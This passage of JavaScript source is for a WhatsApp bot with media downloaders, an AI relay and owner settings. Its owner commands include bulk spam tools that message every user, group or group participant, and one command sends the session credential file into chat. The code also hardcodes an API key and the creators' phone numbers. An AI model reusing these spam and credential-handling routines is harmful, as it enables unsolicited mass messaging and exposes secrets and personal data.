      `> *ᴅᴜʀᴀᴛɪᴏɴ:* ${video.timestamp}\n` +
      `> *ᴜᴘʟᴏᴀᴅᴇᴅ:* ${video.ago}\n` +
      `> *ᴜʀʟ:* ${video.url}\n` +
      `> *Enjoy your music®*\n` +
      `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;
    
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption: body
    }, { quoted: m });
    
    const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;
    const apiResponse = await axios.get(apiUrl);
    
    if (apiResponse.data.success) {
      const { download_url, title } = apiResponse.data.result;
      
      await EliteProEmpire.sendMessage(m.chat, {
        document: { url: download_url }, // Sending as a document
        mimetype: 'audio/mpeg', // MIME type for MP3
        fileName: `${video.title}.mp3`,
        caption: `🎵 *Here’s your song:*\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
      }, { quoted: m });
      
    } else {
      reply(`*Failed to fetch the song! Please try again later.*`);
    }
    
  } catch (error) {
    console.error('Error during /song command:', error);
    reply(`*An error occurred while processing your request. Please try again later.*`);
  }
  break;
}
//Short url links
case 'shorturl': {
  if (!args[0]) return m.reply('Please provide a URL to shorten.');
  let apiUrl = `https://apis.davidcyriltech.my.id/shorten?url=${encodeURIComponent(args[0])}`;

  try {
    let response = await fetch(apiUrl);
    let jsonData = await response.json();
    if (jsonData.success) {
      m.reply(`🔗 *Shortened URL:* ${jsonData.shortUrl}`);
    } else {
      m.reply('Failed to shorten URL using TinyURL.');
    }
  } catch (error) {
    console.error(error);
    m.reply('Error processing your request.');
  }
}
break;
//Code for lyrics downloader
case 'lyrics': {
  if (!text) return reply(`*Example:* ${prefix + command} faded | Alan Walker`);

  try {
    const [title, artist] = text.split('|').map(str => str.trim());
    if (!title || !artist) return reply(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
    const apiUrl = `https://apis.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
    const response = await axios.get(apiUrl);

    if (response.data && response.data.lyrics) {
      const { title, artist, lyrics } = response.data;

      const lyricsMessage = `🎵 *LYRICS DOWNLOADER*\n\n` +
        `*🎶 Title:* ${title}\n` +
        `*🎤 Artist:* ${artist}\n\n` +
        `${lyrics}\n` +
        `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;


      m.reply(lyricsMessage);
    } else {
      reply(`*No lyrics found for:* ${title} by ${artist}`);
    }
  } catch (error) {
    console.error('Error fetching lyrics:', error);
    reply(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
  }
  break;
}
case 'truth1': {
  try {
    const apiUrl = 'https://apis.davidcyriltech.my.id/truth';
    const imagePath = 'https://i.ibb.co/gLNc5SGK/ce5871f200bb421678c982f5af52d7fd.jpg'; // 
    const userTag = `@${m.sender.split('@')[0]}`;


    const response = await axios.get(apiUrl);

    if (response.data.status === 200 && response.data.success) {
      const truthQuestion = response.data.question;


      EliteProEmpire.sendMessage(from, {
        image: { url: imagePath },
        caption: `${userTag}, you chose *TRUTH*!\n\n*Question:* ${truthQuestion}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`,
        mentions: [m.sender],
      }, { quoted: m });
    } else {

      reply('Failed to fetch a truth question. Please try again later.');
    }
  } catch (error) {

    if (error.response) {
      reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
    } else if (error.request) {
      reply('No response received from the API. Please try again later.');
    } else {
      reply(`An error occurred: ${error.message}`);
    }
  }
  break;
}
case 'chatgpt':
case 'ai':
case 'gpt': {
  if (!text) return m.reply("Hi dear, how can i help you today?")
  let prompt = "Your Name Is ElitePro, Your Owner name is ElitePro, your Creator name is Chinedu-MD and HANSTZ, Your channel Whatsapp is , you creator and owner number is 2347047504860, 2348109263390 and 255752380604, a you' from Nigeria, made from Nigeria by ElitePro, come from  from Nigeria, your number is use all 2347047504860 both 2348109263390"
  try {
    let { data } = await axios({
      "method": "GET",
      "url": "https://mannoffc-x.hf.space/ai/logic",
      "params": {
        "q": text,
        "logic": prompt
      }
    })
    m.reply(data.result);
  } catch (e) {
    m.reply(e.message);
    console.log(e);
  }
}
break;
case 'img': case 'anime': {
  if (!text) return reply(`*Example*: ${prefix + command} Anime`);

  try {
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🎨`, key: m.key } });

    const apiUrlForImages = `https://img.hazex.workers.dev/?prompt=${encodeURIComponent(text)}`;

    // Generate and send 5 images
    const footer = "\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇ-ᴘʀᴏ©*";
    for (let i = 0; i < 5; i++) {
      await EliteProEmpire.sendMessage(m.chat, {
        image: { url: apiUrlForImages }, // URL is already constructed
        caption: footer
      }, { quoted: m });
    }

  } catch (error) {
    console.error('Error fetching images:', error);
    reply(`*An error occurred while fetching images. Please try again later.*`);
  }
  break;
}  
    case 'imgsearch': case 'img1': {
      if (!text) {
        return reply(`*Usage:* .img <query>\n\n*Example:* .img laptop`);
      }

      try {
        await EliteProEmpire.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });

        const apiResponse = await axios.get(`https://apis.davidcyriltech.my.id/googleimage`, {
          params: { query: text }
        });

        const { success, results } = apiResponse.data;

        if (!success || !results || results.length === 0) {
          return reply(`❌ No images found for "${text}". Try another search.`);
        }

        const maxImages = Math.min(results.length, 5);
        for (let i = 0; i < maxImages; i++) {
          await EliteProEmpire.sendMessage(m.chat, {
            image: { url: results[i] },
            caption: `📷 *Image Search*\n🔎 *Query:* "${text}"\n📄 *Result:* ${i + 1}/${maxImages}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`,
          }, { quoted: m });
        }

        await EliteProEmpire.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

      } catch (error) {
        console.error("Error in Image Search:", error);
        reply(`❌ *Error fetching images. Try again later.*`);
      }
      break;
    }
case 'imgpng': {
  if (!text) return reply(`*Example*: ${prefix + command} https://i.ibb.co/Y3cv9z7/20240917-072306.jpg`);

  try {
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🔄`, key: m.key } });

    const axios = require('axios');
    const apiUrl = `https://api.nexoracle.com/converter/image2png?apikey=63b406007be3e32b53&img=${encodeURIComponent(text)}`;

    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.result) {
      return reply(`*An error occurred while converting the image. Please check the URL and try again.*`);
    }

    const pngImageUrl = response.data.result;

    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: pngImageUrl },
      caption: `✅ *Image successfully converted to PNG.*`
    }, { quoted: m });

  } catch (error) {
    console.error('Error converting image to PNG:', error);
    reply(`❌ *An error occurred while converting the image. Please try again later.*`);
  }
  break;
}  
// Toggle auto-react feature
case 'autoreact': {
  if (!isAdmins && !XeonTheCreator) return reply("You don't have permission to use this command.");
  
  if (args[0] === "on") {
    db.data.settings[botNumber].autoreact = true;
    reply("*Autoreact has been enabled!*");
  } else if (args[0] === "off") {
    db.data.settings[botNumber].autoreact = false;
    reply("*Autoreact has been disabled!*");
  } else {
    reply("*Usage:* .autoreact on / .autoreact off");
  }
  break;
}
case 'url': {
  try {
    // Required libraries
    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs-extra');
    
    // Function to upload a file to Catbox and return the URL
    async function uploadToCatbox(filePath) {
      if (!fs.existsSync(filePath)) throw new Error("File does not exist");
      try {
        const data = new FormData();
        data.append('reqtype', 'fileupload');
        data.append('userhash', '');
        data.append('fileToUpload', fs.createReadStream(filePath));
        
        const config = {
          method: 'POST',
          url: 'https://catbox.moe/user/api.php',
          headers: {
            ...data.getHeaders(),
          },
          data: data,
        };
        
        const api = await axios.request(config);
        return api.data.trim();
      } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw new Error('Failed to upload to Catbox');
      }
    }
    
    // Check if a reply message exists (image, video, or audio)
    if (!m.quoted) return reply("Please reply to an image, video, or audio file.");
    
    let mediaPath;
    try {
      // Attempt to download the media file
      mediaPath = await EliteProEmpire.downloadAndSaveMediaMessage(m.quoted);
    } catch (err) {
      console.error("Error while downloading media:", err);
      return reply("❌ Unable to download the media file. Please try again.");
    }
    
    if (!mediaPath) {
      return reply("❌ No media file detected. Please reply to an image, video, or audio message.");
    }
    
    // Upload the file using the integrated function
    const fileUrl = await uploadToCatbox(mediaPath);
    
    // Delete the local file after uploading
    fs.unlinkSync(mediaPath);
    
    // Send the uploaded URL as a reply
    reply(`✅ Successfully uploaded! Here is your URL:\n${fileUrl}`);
  } catch (error) {
    console.error("Error while uploading to Catbox:", error);
    reply("❌ Oops, something went wrong while creating your URL.");
  }
  break;
}
case 'update':
if (!XeonTheCreator) return reply("This command is only made for my owner.");
reply(`Checking for updates...`);

try {
  const axios = require('axios');
  
  // URL to fetch the latest version of the file
  const remoteFileUrl = 'https://raw.githubusercontent.com/chinedU-XR-database/file-manager-2/main/ElitePro.js';
  
  // Fetch the latest file content from the main repo using Axios
  const response = await axios.get(remoteFileUrl);
  const latestContent = response.data.trim(); // Trim to avoid formatting issues
  
  // Check if the global memory already has the loaded content
  if (!globalThis.EliteProContent) {
    globalThis.EliteProContent = latestContent;
    console.log("Loaded initial content into memory.");
  }
  
  // Compare the loaded content with the latest content
  if (globalThis.EliteProContent !== latestContent) {
    reply(`Update found! Changes detected. Restarting in 10 seconds...`);
    
    // Update the global content with the new one
    globalThis.EliteProContent = latestContent;
    
    // Restart after delay to ensure response is sent
    await sleep(10000);
    process.exit();
  } else {
    reply(`No update available. You are already on the latest version.`);
  }
} catch (err) {
  reply(`Failed to check for updates: ${err.message}`);
}
break;
case 'pair': {
  if (!text) return reply('❌ Please provide a phone number.\n\nExample: *pair 2347047504860*');
  
  let phoneNumber = text.trim();
  let pairingUrl = `https://elitepro-session-id.onrender.com/pair?phone=${phoneNumber}`;
  
  try {
    let response = await fetch(pairingUrl);
    let rawText = await response.text(); // Read response as text
    
    console.log(`ELITEPRO RESPONSE:`, rawText); // Log raw response for debugging
    
    // Check if response is JSON
    try {
      let data = JSON.parse(rawText); // Attempt to parse JSON
      console.log(`✅ Parsed JSON:`, data);
      
      if (data.code) {
        reply(`✅ *Pairing Successful!*\n\n📱 *Phone:* ${phoneNumber}\n🔗 *Pairing Code:* *${data.code}*`);
      } else {
        console.error(`❌ Pairing failed:`, data);
        reply(`❌ Pairing failed. Please try again later.`);
      }
    } catch (jsonError) {
      console.error(`❌ Invalid JSON from API:`, rawText);
      reply('❌ Server error: API returned an invalid response.');
    }
  } catch (error) {
    console.error(`❌ Error fetching pairing code:`, error);
    reply(`❌ Error fetching pairing code. Please check the website or try again later.`);
  }
}
break;

break
case 'bug':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
reply("Chat the creator to unlock commands.\n*Link:* https://wa.link/e27uuw")
break
case 'gcbug':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
reply("Chat the creator to unlock commands.\n*Link:* https://wa.link/e27uuw")
//Thanks for loveing us. All Chinedu-MD codes stop here..
            break
            case 'addtitle':{
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!text) return reply(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await reply(mess.done)
            }
            break
            case 'deltitle':{
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!text) return reply(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await reply(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                reply(mess.done)
            }
            break
            case 'dellimit':{
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return reply(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                reply(mess.done)
            }
            break
            case 'addprem':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 2)
                    return reply(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    reply("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    reply("Premium Success")
                }
            break
            case 'delprem':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2348109263390`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    reply("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    reply("Delete Success")
                }
            break
            case 'listprem': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                EliteProEmpire.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await EliteProEmpire.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 2348109263390`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
reply(`This Number ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                reply(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!XeonTheCreator) return reply("This command is only made for my owner.")
                    if (!text) return reply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    EliteProEmpire.groupAcceptInvite(result)
                    await reply(`Done`)
                } catch {
                    reply('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                reply('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                EliteProEmpire.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                EliteProEmpire.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            EliteProEmpire.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'restart':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                reply(`Restarting will be completed in 10sec`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    reply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    reply(`Successfully changed autoread to ${q}`)
                }
            break
            case 'unavailable':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    reply(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    reply(`Successfully changed unavailable to ${q}`)
                }
            break
            case 'autorecordtype':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    reply(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    reply(`Successfully changed Auto-RecordingTyping to ${q}`)
                }
            break
            case 'autorecord':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    reply(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    reply(`Successfully changed Auto-Recording to ${q}`)
                }
            break
            case 'autotype':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    reply(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    reply(`Successfully changed Auto-Typing to ${q}`)
                }
            break
            case 'autobio':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autosticker': case 'autostickergc':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    reply(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    reply(`Successfully Changed Auto Sticker To ${q}`)
                }
            break
            case 'autodownload': case 'autodl':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    reply(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    reply(`Successfully Changed Auto Download To ${q}`)
                }
            break
            case 'autoblock':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    reply(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    reply(`Successfully Changed Auto-Block To ${q}`)
                }
            break
            case 'onlygroup':
            case 'onlygc':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    reply(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    reply(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    reply(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    reply(`Successfully Changed Only-Pc To ${q}`)
                }
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    reply(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    reply(`Successfully Changed Only-Indian To ${q}`)
                }
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    reply(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    reply(`Successfully Changed Only-Indonesian To ${q}`)
                }
            break
            case 'private': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                EliteProEmpire.public = false
                reply('*Successful in Changing To private Usage*')
            }
            break
            case 'public': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                EliteProEmpire.public = true
                reply('*Successful in Changing To Public Usage*')
            }
            break
            case 'mode':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (args.length < 1) return reply(`Example ${prefix + command} public/private`)
                if (q == 'public') {
                    EliteProEmpire.public = true
                    reply(mess.done)
                } else if (q == 'private') {
                    EliteProEmpire.public = false
                    reply(mess.done)
                }
            break
            case 'setexif':
            case 'setwm':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                reply(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                reply(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                reply(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                reply(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await EliteProEmpire.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await EliteProEmpire.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await EliteProEmpire.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'left':
            case 'leave':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!m.isGroup) return reply("This command is for group use only.")
                reply('Bye Everyone 🥺')
                await EliteProEmpire.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!text) return reply('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await EliteProEmpire.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await EliteProEmpire.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await EliteProEmpire.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               reply(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'jpm': case 'post': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await reply(`Waiting in progress`)
let getGroups = await EliteProEmpire.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await EliteProEmpire.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await EliteProEmpire.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await EliteProEmpire.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
            case 'pushcontact': {
    if (!XeonTheCreator) return reply("This command is only made for my owner.")
      if (!m.isGroup) return reply(`The feature works only in grup`)
    if (!text) return reply(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    reply(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    EliteProEmpire.sendMessage(pler, { text: q})
     }  
     reply(`Done`)
      }
      break
case "pushcontactv2":{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!q) return reply(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await XeonStickWait()
const metadata2 = await EliteProEmpire.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
EliteProEmpire.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
reply(`Success`)
}
break
case 'pushcontactv3':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!isGroup) return reply("This command is for group use only.")
if (!text) return reply(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await EliteProEmpire.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await EliteProEmpire.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await EliteProEmpire.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
reply(`Success`)
break
case 'block': case 'ban': {
		if (!XeonTheCreator) return reply("This command is only made for my owner.")
